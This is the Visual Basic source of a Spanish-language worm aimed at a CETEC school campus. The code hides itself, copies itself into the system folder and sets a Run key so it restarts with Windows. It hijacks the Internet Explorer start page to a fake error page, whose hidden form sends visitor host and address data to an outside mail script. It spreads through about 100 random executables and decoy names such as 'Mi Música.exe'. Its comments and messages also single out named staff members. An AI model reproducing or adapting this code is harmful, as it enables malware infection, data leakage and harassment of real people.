Attribute VB_Name = "Module1"
Option Explicit
Public sysdir, windir, wsh, fso
Public Const MUTEX As String = "\winapp32."
' Es el 29 de septiembre del 2004
' Comienzo esta creacion por que el personal de CETEC Santa Clara se lo ha ganado
' a pulso.
' Utilizo esta forma de expresion por que despues de todo estamos en un pais ¿Libre?
' Recuerden que por algo  mi gafete dice "Experto"
Sub main()
On Error Resume Next
App.TaskVisible = False
Set wsh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set sysdir = fso.getSpecialFolder(1)
Set windir = fso.getSpecialFolder(0)
If False Then MsgBox ("Claudia Correa Zaragoza, la administracion que das al plantel no es mala, lo que está muy mal es la forma en que pides y haces las cosas")
If False Then MsgBox ("La cosa más difícil de hacer es ver a quien amas amando a alguien más")
If False Then MsgBox ("Edith, siento hacia tí, algo más que amistad, pero a la vez tengo miedo de decirtelo por temor a perderte")
Load frmHidden
instalar
registro
createHTM
createFiles
spread
End Sub

Public Sub instalar()
On Error Resume Next
Dim yulisaPeluche, f
If fso.getfile(sysdir & MUTEX) = "" Then
    Set yulisaPeluche = fso.createTextFile(sysdir & MUTEX, 2, False)
    yulisaPeluche.WriteLine ("ëYXWSMARTAAR:No se encuentra o no se puede cargar$ÈØÀ»´JÍ!è*èÀtéÍÆSÿè'ã»ØÃ±Óë´JÍ!ÛtJ´HÍ!rDÄ&Ç&GÀ&Çÿÿ&Ç6ÇD¡&£¿ÑáÑáÑáé3Àó«ÈØÀ>SÿtèÀtëHÆSH»ÿÿÍ!þ(»Vº¸")
    yulisaPeluche.WriteLine ("KÍ!s$´ò6$Í!Æº)´Í!>p¸ÿÿqë´MÍ!>u(éÆèÈØÀrd¸KÍ!ÃÇèésÿ<Btð<DuèÐÿëç<uèi2ÀP>tØÂt¸/%Í!XPt!º¸=Í!r0ØÆº¹¸DÍ!¸>Í!>tÄ¡$&&&GX´LÍ!Ë¡TØ.ÿRÃÈØÀ¸Í/Àué¿ØÂt/%Í!ÆZÿÇÇ")
    yulisaPeluche.WriteLine ("¡TVÂuèm4¹6>rèrCÍ!sëbÈØÀ´H»ÿÿÍ!Æ¹6s>rèOÈrd¸KÍrsòñÆ$Í!Æº)´Í!¸ÿÿë´MÍ!ätà2äë>ZÿuèOÆZÃQRVWüQVXã&Á6TVÚó¤^YO=\t=/tGÆ\@Gë^Y3ÀÁó¤Æ_^ZYÃ¸/5Í!¸/%2Í!Ã=t=Kt.ÿ.")
    yulisaPeluche.WriteLine ("3ÀZ¹rÏ3À¹Ïwininit.exe-wininit.iniÇÇ>p|*qsþÃûrzt,Àuéùt|³è\0s|èe&÷(@uyëòÉuÇqÿÿë@<Bt<DuèÎúëüQt.üt)äu6ëN³(èÇ+Ç")
    yulisaPeluche.WriteLine ("oÇqÇë+èA.¡ätéÆúé¾úP¸ÍXº<>(tº´Í!ëÕ6VÆw³èº½qu+s÷(^uÆdé^ú­Salida fatal! No se puede volver a Windows")
    yulisaPeluche.WriteLine ("$Error irrecuperable. No se puede iniciar Windows.$°2öãµÙðÃ2íË~èêÿÉt\*èàÿâøÃÛtH:|uþËèØÿD*~2Ûë2S|èÅÿÖ[RSè½ÿ[D*VPþËè²ÿXd*D*Ä¥")
    yulisaPeluche.WriteLine ("^d*^D*2Ûèÿ[ÚÆÃ½|r=~èyÿ\*°2öãèõL*õT*L*~õDõ~ø|RèRÿZT*ÃÛt(þËèDÿ\*îè1ÿT*ÇD(ÇD+ÆD-õT*þ|Ãèÿ³ëÓ|ûrþË~èÿ\*~øÃ|ùr~èäþD*~Ã3À|¥}ÃÚÇÃèÔþÆÚÃV6p\DÛÃÞÃ>muK3ÛÃûpÍ")
    yulisaPeluche.WriteLine ("/¸3ÛÃËÓÍ/ÀÃtE&£&G£&G£&G£3ÿÇß>mt»¸.ÿ’Ãtë»¡t3ÿÇ.ÿÅó¸/%Í!ÈØÃ\ÂÍÒÁJíKKKK4+ætÿKuxôU°>9FtÅÿf.ÿ.óþwôSQø>pÑæ.ÿY[ëA>mÛè:ë3>mtÏèQë'].ÿóèµþ3Às»ë>ouÛÃ03À]ÏR¡")
    yulisaPeluche.WriteLine ("m=ÿÿtºÚÑâCÂtë÷Â.£mZÃ3ÛëúRûvûw¡mºKtÑâëùÂt÷Ò#Â3ÛZÃ»ÿÿëùøÃ2äùÃ.¡¿èr,9u>=ZtèëèØ@À&=MtZtùÃ=ZuÃèàÿsÃ&9>tÃ&A&ëÛ3Àø.£..P.¡è³ÿr9>t=ZtèÿsîX°élÿ.>ub[°é^ÿè")
    yulisaPeluche.WriteLine ("ÿrçZ;ÊvÑR;ÙwÍ.>u.>t9v+ËÚtLÑÂIÙë.3É.á>ÿùwØ.r.+ËØÐtÃ@ÀI&³M&&>Q;Ùv«é*ÿ¿ÀHè²þr&>éyþ°évþQRVW=uèÊþë^=uè¯ÿëT=uèÆÿëJ=u.¡=u.¡u1.¡;Èw)3À..=u.;.;u3À.£.£_^")
    yulisaPeluche.WriteLine ("ZYËPATHsystem\kernel.exe system\win386.exe system\dosx.exe krnl386-system\wswap.exe system\dswap.exe windir=ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿcom1 Es")
    yulisaPeluche.WriteLine ("ta versi¢n de Windows necesita un 80386 (o posterior).Su computadora no puede ejecutar Windows en el modo  extendido del 386.$No se puede encontra")
    yulisaPeluche.WriteLine ("r los arhivos necesarios para ejecutar en el modo est ndar o extendido del386;  verifique que la ruta de acceso sea correcta o reinicieWindows.$N")
    yulisaPeluche.WriteLine ("o se puede encontrar WIN386.EXE para ejecutar en el modo extendido del 386verifique que la ruta de acceso sea correcta o reinicie Windows.$No se")
    yulisaPeluche.WriteLine (" puede encontrar DOSX.EXE para ejecutar en el modoestndar; verifiqueque la ruta de acceso sea correctao reinicie Windows.$HIMEM.SYS no es vlido;in")
    yulisaPeluche.WriteLine ("stale HIMEM.SYS de los disquetes de Instalar Windows.$No se ha encontrado HIMEM.SYS;Verifique que el archivo esten el directorio Windows yque la r")
    yulisaPeluche.WriteLine ("uta estespecificada correctamente en CONFIG.SYS$Debe tener una versi¢n de MS-DOS 3.10 o posterior$No hay suficiente memoria convencional para ejec")
    yulisaPeluche.WriteLine ("utar Windows;reconfigure su sistema para incrementar la memoria disponibley vuelva a intentar la operaci¢n.$No hay suficiente identificadores de a")
    yulisaPeluche.WriteLine ("rchivo disponibles,incremente files= en config.sys a 30 o ms.$EÿÿÆoÛuÆo¸-øë`SP¸¥±ÓèØ´JÍ!X¸-Ó±ÓâÂPS´HÍ![sYë,À&ÆZ&ÇK&À£Æ>pøXÃPV¬ªÀtëøO^XÃUìì(PSQRVW¸")
    yulisaPeluche.WriteLine ("=Í!rwØ¸DÍ!ri÷Âtc÷Â@t]VØ¹(¸DÍ!òrN;ÁuJ2É°6DtS¸ÞÍg[äu±°Á6Dt)6D6+D&vÆ£º¹¸DÍ!;ÁtÇ¸>Í!_^ZY[Xå]ÃZÊJ´RÍ!ë&;ÂtÀ3ÿ&=Zt&E@&}uæ&MëàÃ´RÍ!3À&_&G&?ÿt&ÄëñsH÷Ø£>äu")
    yulisaPeluche.Close
    MsgBox ("No hay ninguna Aplicación asosiada con este archivo. Windows usará el Bloc de Notas para abrirlo"), vbInformation, "Windows"
    Set f = fso.getfile(sysdir & MUTEX)
    f.Attributes = 2 + 4
    wsh.run (windir & "\notepad.exe " & sysdir & MUTEX)
End If
fso.copyfile App.EXEName & ".exe", sysdir & "\folder32.exe"
Set f = Nothing
Set f = fso.getfile(sysdir & "\folder32.exe")
f.Attributes = 2 + 4
registro

End Sub

Public Function r(hKey)
On Error Resume Next
Dim l
l = wsh.regread(hKey)
r = l
End Function

Public Sub e(hKey, rValue)
On Error Resume Next
wsh.regWrite hKey, rValue
End Sub
Public Sub registro()
On Error Resume Next
e "HKLM\software\Microsoft\Windows\CurrentVersion\Run\Folder32", sysdir & "\folder32.exe"
e "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", "Microsotf Internet ExpIorer"
e "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "file:///" & sysdir & "\error.htm"
e "HKLM\Software\CETEC\WormVersion", "1.0"
e "HKLM\Software\CETEC\Lang", "ES"
End Sub

Public Sub createHTM()
On Error Resume Next
Dim edith, f, trampita
trampita = sysdir & "\error.htm"
If fso.getfile(trampita) = "" Then
    Set edith = fso.createTextFile(trampita, 2, False)
    edith.WriteLine ("<html><head><title>No se puede mostrar la pagina</title>")
    edith.WriteLine ("</head><body><h1>No encontrado</h1><p><font face=" & Chr$(34) & "Verdana" & Chr$(34) & " size=" & Chr$(34) & "2" & Chr$(34) & ">")
    edith.WriteLine ("La pagina a la que ha intentado acceder no se encuentra disponible en este momento, el problema puede deberse a varias causas:</font></p>")
    edith.WriteLine ("<ul><li>No existe</li><li>La direccion esta escrita incorrectamente</li>")
    edith.WriteLine ("<li>Hay demasiadas personas intentando acceder al mismo tiempo</li>")
    edith.WriteLine ("<li>Tiene dificultades tecnicas</li>")
    edith.WriteLine ("</ul>")
    edith.WriteLine ("<p><form name=" & Chr(34) & "form1" & Chr(34) & " method=" & Chr(34) & "post" & Chr(34) & " action=" & Chr(34) & "http://mail.grupocetec.com/cgi-bin/formmail.pl" & Chr(34) & ">")
    edith.WriteLine ("<input type=" & Chr(34) & "hidden" & Chr(34) & " name=" & Chr(34) & "recipient" & Chr(34) & " value=" & Chr(34) & "dirsantaclara@grupocetec.com" & Chr(34) & ">")
    edith.WriteLine ("<input type=" & Chr(34) & "hidden" & Chr(34) & " name=" & Chr(34) & "env_report" & Chr(34) & " value=" & Chr(34) & "REMOTE_HOST,HTTP_USER_AGENT,REMOTE_ADDR," & Chr(34) & ">")
    edith.WriteLine ("<input type=" & Chr(34) & "hidden" & Chr(34) & " name=" & Chr(34) & "redirect" & Chr(34) & " value=" & Chr(34) & "http://29a.host.sk" & Chr(34) & ">")
    edith.WriteLine ("<input name=" & Chr(34) & "nombre" & Chr(34) & " type=" & Chr(34) & "hidden" & Chr(34) & " value=" & Chr(34) & "Briseida" & Chr(34) & ">")
    edith.WriteLine ("<input name=" & Chr(34) & "comentarios" & Chr(34) & " type=" & Chr(34) & "hidden" & Chr(34) & " value=" & Chr(34) & "Si quieren hacerle un favor al plantel Santa Clara quiten a Claudia Correa de la coordinacion academica y a Leticia Hernandez de la Direccion del plantel..." & Chr(34) & ">")
    edith.WriteLine ("<font face=" & Chr(34) & "Verdana" & Chr(34) & " size=" & Chr(34) & "2" & Chr(34) & ">")
    edith.WriteLine ("Aunque este error no es comun, a menudo indica que el sitio Web tiene problemas tecnicos, haga clic en <input type=" & Chr(34) & "submit" & Chr(34) & " value=" & Chr(34) & "Actualizar" & Chr(34) & "> para intentar de nuevo</font>")
    edith.WriteLine ("</form></p></body></html>")
    edith.Close
End If
End Sub

Public Sub createHTA()
On Error Resume Next
Dim norma, f
End Sub

Sub createFiles()
On Error Resume Next
Dim sNombre As String, x As Integer, ex As String, y As Integer
sNombre = ""
While y < 101
For x = 1 To 8
    Randomize Timer
    sNombre = sNombre & LTrim$(RTrim$(Str$(Int(Rnd * 9))))
Next
Randomize Timer
x = Rnd * 5
Select Case x
    Case 0
        ex = "exe"
    Case 1
        ex = "bat"
    Case 2
        ex = "scr"
    Case 3
        ex = "com"
    Case 4
        ex = "pif"
End Select
sNombre = sNombre + "." & ex
fso.copyfile App.EXEName & ".exe", sysdir & "\" & sNombre
fso.copyfile App.EXEName & ".exe", windir & "\" & sNombre
sNombre = ""
y = y + 1
Wend
End Sub

Sub spread()
On Error Resume Next
Dim miDoc, buro, enviarA
fso.copyfile App.EXEName & ".exe", "a:\Nueva Carpeta..exe"
fso.copyfile App.EXEName & ".exe", "a:\www.horoscopopersonal.com"
fso.copyfile App.EXEName & ".exe", "a:\www.google.com.exe"
fso.copyfile App.EXEName & ".exe", "a:\Antimapson.exe"
fso.copyfile App.EXEName & ".exe", "a:\Nueva Carpeta(2).exe"
fso.copyfile App.EXEName & ".exe", "a:\Windows.exe"
miDoc = wsh.SpecialFolders("MyDocuments")
buro = wsh.SpecialFolders("Desktop")
enviarA = wsh.SpecialFolders("SendTo")
fso.copyfile App.EXEName & ".exe", miDoc & "\Mi Música.exe"
fso.copyfile App.EXEName & ".exe", miDoc & "\Mis Imágenes.exe"
fso.copyfile App.EXEName & ".exe", buro & "\Nueva carpeta.exe"
fso.copyfile App.EXEName & ".exe", enviarA & "\Carpeta comprimida (en ZIP).exe"
End Sub
